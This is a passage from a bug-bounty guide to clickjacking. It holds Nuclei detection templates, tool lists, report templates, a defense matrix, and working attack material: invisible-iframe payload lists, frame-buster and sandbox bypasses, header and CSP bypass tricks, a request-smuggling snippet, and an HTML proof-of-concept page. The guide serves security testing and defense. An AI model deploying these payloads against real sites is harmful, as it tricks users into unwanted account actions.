1. **Identify state-changing actions:**
   - Account deletion
   - Email/password change
   - Fund transfer
   - Permission changes
   - OAuth authorization

2. **Check for GET-based actions:**
   - URLs with `action=`, `do=`, `cmd=` parameters
   - REST endpoints that perform actions via GET

3. **Check for prefilled forms:**
   - Forms that accept URL parameters for pre-population

### Phase 3: Protection Bypass Testing

1. **Frame buster detection:**
   ```javascript
   // Check if page has frame-busting code
   if (window.top !== window.self) { ... }
   ```

2. **Sandbox bypass testing:**
   ```html
   <iframe src="target" sandbox="allow-forms"></iframe>
   ```

3. **onBeforeUnload testing**

4. **XSS filter bypass testing**

### Phase 4: Exploit Chain Development

1. **Single-step clickjacking:** Basic overlay
2. **Multi-step clickjacking:** Sequential actions
3. **Chained with XSS:** DOM XSS carrier
4. **Chained with cache poisoning:** Persistent attack
5. **Chained with request smuggling:** Protection bypass
6. **Chained with postMessage:** Cross-window manipulation

---

## 21. Nuclei Templates

### Basic Clickjacking Detection Template

```yaml
id: missing-clickjacking-protection

info:
  name: Missing Clickjacking Protection
  author: your-name
  severity: low
  description: |
    The target does not implement X-Frame-Options or CSP frame-ancestors
    headers, making it vulnerable to clickjacking attacks.
  remediation: |
    Implement X-Frame-Options: DENY or SAMEORIGIN, or
    Content-Security-Policy: frame-ancestors 'none' or 'self'.
  tags: clickjacking, x-frame-options, csp

requests:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - '!contains(tolower(header), "x-frame-options")'
          - '!contains(tolower(header), "frame-ancestors")'
      - type: status
        status:
          - 200
          - 301
          - 302
```

### X-Frame-Options Bypass Detection

```yaml
id: x-frame-options-weak

info:
  name: Weak X-Frame-Options Configuration
  author: your-name
  severity: medium
  description: |
    X-Frame-Options is set to ALLOW-FROM or uses weak configuration
    that may be bypassed in some browsers.

requests:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: regex
        part: header
        regex:
          - '(?i)x-frame-options:\s*allow-from'
          - '(?i)x-frame-options:\s*$'
          - '(?i)x-frame-options:\s*none'
```

### CSP Frame-Ancestors Detection

```yaml
id: csp-frame-ancestors-missing

info:
  name: Missing CSP Frame-Ancestors
  author: your-name
  severity: low
  description: |
    Content-Security-Policy does not include frame-ancestors directive.

requests:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers-condition: and
    matchers:
      - type: regex
        part: header
        regex:
          - '(?i)content-security-policy:'
      - type: dsl
        dsl:
          - '!contains(tolower(header), "frame-ancestors")'
```

---

## 22. Tools and Scanners

### Clickjacking-Specific Tools

| Tool | Purpose | Link |
|------|---------|------|
| Clickbandit (Burp Suite) | Automated PoC generation | Burp Suite Professional |
| Clickjack | Clickjacking testing tool | github.com/machine1337/clickjack |
| X-Frame-Options Checker | Header validation | Custom scripts |

### General Web Security Tools

| Tool | Purpose | Link |
|------|---------|------|
| Burp Suite | Full web app testing | portswigger.net/burp |
| OWASP ZAP | Open source web scanner | zaproxy.org |
| Nuclei | Fast vulnerability scanner | projectdiscovery.io/nuclei |
| HTTP Request Smuggler | Desync detection | PortSwigger BApp Store |
| Param Miner | Hidden parameter discovery | PortSwigger BApp Store |
| Turbo Intruder | High-speed HTTP attacks | PortSwigger BApp Store |
| postMessage-tracker | postMessage analysis | github.com/fransr/postMessage-tracker |
| pp-finder | Prototype pollution gadgets | github.com/yeswehack/pp-finder |

### Recon Tools

| Tool | Purpose |
|------|---------|
| subfinder | Subdomain enumeration |
| httpx | HTTP probing |
| katana | Web crawler |
| naabu | Port scanning |
| interactsh | Out-of-band interaction |

---

## 23. Advanced Research

### HTTP/1.1 Must Die (James Kettle, 2025)

Key findings on request smuggling evolution:
- **Parser discrepancy detection:** Root-cause detection via V-H and H-V discrepancies
- **0.CL desync attacks:** Breaking the deadlock with early-response gadgets
- **Expect-based desync:** Using Expect: 100-continue for new attack vectors
- **Double-desync:** Converting 0.CL to CL.0 for weaponization

### Browser-Powered Desync Attacks (2022)

- **Client-Side Desync (CSD):** Poisoning browser connection pools
- **Pause-based desync:** Triggering misguided request-timeout implementations
- **Stacked-response problem:** Browser discards connections with excess data
- **HEAD technique:** Combining headers with HTML body for XSS

### Web Cache Entanglement (2020)

- **Cache parameter cloaking:** Hiding parameters from cache key
- **Fat GET:** GET requests with body not included in cache key
- **Cache key injection:** Injecting via delimiter confusion
- **Internal cache poisoning:** Application-level cache attacks

### Hidden OAuth Attack Vectors (2021)

- **Dynamic Client Registration SSRF:** Second-order SSRF via registration endpoint
- **redirect_uri Session Poisoning:** Race conditions in OAuth flow
- **WebFinger User Enumeration:** Information disclosure via .well-known endpoints

---

## 24. Bug Bounty Writeups

### Common Clickjacking Report Templates

**Template 1: Basic Clickjacking**
```
Title: Clickjacking on [Endpoint] - [Action] without user consent

Description:
The [endpoint] at [URL] does not implement X-Frame-Options or 
CSP frame-ancestors headers, allowing it to be embedded in an iframe.
An attacker can trick users into performing [action] without their knowledge.

Steps to Reproduce:
1. Save the attached PoC HTML file
2. Open it in a browser while logged into [target]
3. Click the "[Decoy text]" button
4. Observe that [action] is performed

Impact:
- [Specific impact based on action]

PoC:
[Attach HTML file]
```

**Template 2: Multi-Step Clickjacking**
```
Title: Multi-Step Clickjacking leading to [Outcome]

Description:
[Endpoint] requires multiple steps to [perform action]. By using 
sequential iframe positioning, an attacker can automate the entire 
flow through clickjacking.

Steps:
1. [Step 1 details]
2. [Step 2 details]
3. [Step 3 details]

Impact:
- Complete [action] without user awareness
```

**Template 3: Clickjacking + XSS Chain**
```
Title: Clickjacking enables exploitation of DOM XSS on [Page]

Description:
The DOM XSS at [URL] requires user interaction to trigger. 
Clickjacking provides the necessary interaction vector, converting 
a self-XSS into a stored/reflective XSS affecting all users.
```

### Bounty Tips

1. **Always provide a working PoC** - HTML file that demonstrates the attack
2. **Show real impact** - Don't just report "missing header"; show what action can be forced
3. **Test on multiple browsers** - Some protections vary by browser
4. **Check mobile versions** - Mobile sites often have weaker protections
5. **Test OAuth flows** - Authorization endpoints are high-value targets
6. **Chain with other vulnerabilities** - Clickjacking alone is often low severity; chains get higher rewards

---

## 25. Payload Collections

### Comprehensive Payload List

```html
<!-- 1. Basic opacity-based -->
<iframe src="TARGET" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>

<!-- 2. z-index layering -->
<div style="position:relative;z-index:1;">DECOY</div>
<iframe src="TARGET" style="position:absolute;z-index:2;opacity:0;"></iframe>

<!-- 3. Sandbox bypass -->
<iframe src="TARGET" sandbox="allow-forms"></iframe>

<!-- 4. Sandbox + scripts -->
<iframe src="TARGET" sandbox="allow-forms allow-scripts"></iframe>

<!-- 5. Credentialless -->
<iframe src="TARGET" credentialless></iframe>

<!-- 6. CSP bypass attempt -->
<iframe src="TARGET" csp="default-src *;"></iframe>

<!-- 7. Pointer-events manipulation -->
<iframe src="TARGET" style="pointer-events:none;opacity:0;"></iframe>

<!-- 8. Clip-path hiding -->
<iframe src="TARGET" style="clip-path:circle(0%);opacity:0;"></iframe>

<!-- 9. Transform hiding -->
<iframe src="TARGET" style="transform:scale(0);opacity:0;"></iframe>

<!-- 10. Visibility with size -->
<iframe src="TARGET" style="visibility:hidden;width:100%;height:100%;position:absolute;"></iframe>
```

### Frame-Buster Bypass Payloads

```html
<!-- Bypass: onBeforeUnload -->
<script>window.onbeforeunload=function(){return"Leave?"};</script>
<iframe src="TARGET"></iframe>

<!-- Bypass: Double framing -->
<iframe src="middle.html"></iframe>
<!-- middle.html: -->
<iframe src="TARGET"></iframe>

<!-- Bypass: IE restricted -->
<iframe src="TARGET" security="restricted"></iframe>

<!-- Bypass: XSSAuditor -->
<iframe src="TARGET?x=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D"></iframe>

<!-- Bypass: 204 loop -->
<script>
var pb=0;window.onbeforeunload=function(){pb++};
setInterval(function(){if(pb>0){pb-=2;window.top.location="/204"}},1);
</script>
<iframe src="TARGET"></iframe>
```

---

## 26. WAF Bypasses

### Header Obfuscation

```http
# Case variations
X-FRAME-OPTIONS: DENY
x-frame-options: deny
X-Frame-Options: deny

# Whitespace obfuscation
X-Frame-Options : DENY
 X-Frame-Options: DENY
X-Frame-Options:  DENY
X-Frame-Options: DENY 

# Multiple headers
X-Frame-Options: SAMEORIGIN
X-Frame-Options: DENY

# Invalid values
X-Frame-Options: 
X-Frame-Options: ;
X-Frame-Options: none
X-Frame-Options: allow
```

### CSP Bypass Techniques

```http
# Missing semicolon
Content-Security-Policy: default-src 'self' frame-ancestors 'none'

# Case sensitivity
content-security-policy: frame-ancestors 'none'

# Multiple CSP headers
Content-Security-Policy: frame-ancestors 'self'
Content-Security-Policy: frame-ancestors *

# Report-only bypass
Content-Security-Policy-Report-Only: frame-ancestors 'none'
# (Report-Only does NOT enforce)
```

### Request Smuggling to Bypass WAF

```http
# Hide frame-busting headers from WAF but not backend
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

4
GET /
0

GET /page HTTP/1.1
Host: target.com
X-Frame-Options: ALLOWALL
```

---

## 27. Detection Techniques

### Automated Detection

```bash
# Check headers with curl
curl -sI https://target.com | grep -iE "x-frame-options|frame-ancestors"

# Mass check with httpx
cat urls.txt | httpx -silent -H "X-Frame-Options: CHECK" -match-string "MISSING"

# Nuclei scan
nuclei -l targets.txt -t http/vulnerabilities/clickjacking/
```

### Manual Detection Checklist

- [ ] Check for `X-Frame-Options` header in response
- [ ] Check for `Content-Security-Policy` with `frame-ancestors`
- [ ] Verify headers are not in meta tags (meta tags are ineffective)
- [ ] Test actual framing with HTML PoC
- [ ] Check for frame-busting JavaScript
- [ ] Test sandbox bypass if frame busters present
- [ ] Check mobile version of site
- [ ] Check OAuth authorization endpoints
- [ ] Check password/email change forms
- [ ] Check account deletion flows
- [ ] Check payment/transfer endpoints
- [ ] Check admin panel accessibility

### Clickjacking Proof-of-Concept Template

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        #container { position: relative; width: 500px; height: 400px; margin: 0 auto; }
        #decoy { 
            position: absolute; 
            top: 150px; 
            left: 150px; 
            padding: 20px 40px; 
            background: #007bff; 
            color: white; 
            border-radius: 5px;
            cursor: pointer;
            z-index: 1;
        }
        iframe { 
            position: absolute; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            opacity: 0.0001; 
            z-index: 2; 
        }
    </style>
</head>
<body>
    <h1>Clickjacking Proof of Concept</h1>
    <div id="container">
        <div id="decoy">Click here to continue</div>
        <iframe src="TARGET_URL_HERE"></iframe>
    </div>
    <p>If you clicked the button above, the action was performed without your knowledge.</p>
</body>
</html>
```

---

## 28. References

### Primary Sources

1. **PortSwigger Web Security Academy - Clickjacking**
   - https://portswigger.net/web-security/clickjacking

2. **PortSwigger Research - Browser-Powered Desync Attacks**
   - https://portswigger.net/research/browser-powered-desync-attacks

3. **PortSwigger Research - Web Cache Entanglement**
   - https://portswigger.net/research/web-cache-entanglement

4. **PortSwigger Research - Practical Web Cache Poisoning**
   - https://portswigger.net/research/practical-web-cache-poisoning

5. **PortSwigger Research - Hidden OAuth Attack Vectors**
   - https://portswigger.net/research/hidden-oauth-attack-vectors

6. **PortSwigger Research - HTTP/1.1 Must Die**
   - https://portswigger.net/research/http1-must-die

7. **PortSwigger Research - Cracking the Lens**
   - https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface

8. **PayloadsAllTheThings - Clickjacking**
   - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking

9. **HackTricks - Clickjacking**
   - https://book.hacktricks.wiki/en/pentesting-web/clickjacking.html

10. **MDN - X-Frame-Options**
    - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options

11. **MDN - CSP frame-ancestors**
    - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors

12. **MDN - postMessage**
    - https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage

### Tools & Frameworks

13. **Burp Suite / Clickbandit** - https://portswigger.net/burp
14. **OWASP ZAP** - https://www.zaproxy.org/
15. **Nuclei** - https://github.com/projectdiscovery/nuclei
16. **HTTP Request Smuggler** - https://github.com/PortSwigger/http-request-smuggler
17. **Param Miner** - https://github.com/PortSwigger/param-miner
18. **postMessage-tracker** - https://github.com/fransr/postMessage-tracker
19. **pp-finder** - https://github.com/yeswehack/pp-finder
20. **CursedChrome** - https://github.com/mandatoryprogrammer/CursedChrome
21. **Client-Side Prototype Pollution** - https://github.com/BlackFan/client-side-prototype-pollution

### Research Papers & Writeups

22. **Gustav Rydstedt - Clickjacking** (2010)
23. **IE8 XSS Filter - Frame Buster Neutralization**
24. **Chrome XSSAuditor - Script Neutralization**
25. **OWASP - Clickjacking Defense Cheat Sheet**

---

## Appendix A: Quick Reference Card

### Header Defense Matrix

| Defense | Effectiveness | Browser Support | Notes |
|---------|--------------|-----------------|-------|
| `X-Frame-Options: DENY` | High | IE8+, All modern | Best for complete blocking |
| `X-Frame-Options: SAMEORIGIN` | High | IE8+, All modern | Allows same-origin framing |
| `X-Frame-Options: ALLOW-FROM` | Low | Deprecated | Not supported in Chrome/Safari |
| `CSP: frame-ancestors 'none'` | High | Modern browsers | Preferred modern standard |
| `CSP: frame-ancestors 'self'` | High | Modern browsers | Allows same-origin framing |
| Frame-busting JS | Medium | All (if JS enabled) | Bypassable with sandbox |

### Attack Technique Matrix

| Technique | Prerequisites | Complexity | Impact |
|-----------|--------------|------------|--------|
| Basic Clickjacking | No XFO/CSP | Low | Medium |
| Multi-Step | Sequential actions | Medium | High |
| Drag-and-Drop | File upload zones | Medium | High |
| Cursorjacking | CSS/JS control | High | Medium |
| OAuth Clickjacking | OAuth endpoints | Medium | Critical |
| DOM XSS Chain | URL-based DOM XSS | Medium | Critical |
| Cache Poisoning | Caching infrastructure | High | Critical |
| Request Smuggling | Proxy chain | Very High | Critical |

### Sandbox Attribute Reference

| Token | Effect |
|-------|--------|
| `allow-forms` | Form submission |
| `allow-scripts` | Script execution |
| `allow-same-origin` | Same-origin access |
| `allow-top-navigation` | Top-level navigation |
| `allow-popups` | Popup windows |
| `allow-popups-to-escape-sandbox` | Unsandboxed popups |
| `allow-modals` | Modal dialogs |
| `allow-pointer-lock` | Pointer Lock API |
| `allow-downloads` | File downloads |

---

*Document compiled for advanced bug bounty hunting and security research. Use responsibly and only on authorized targets.*
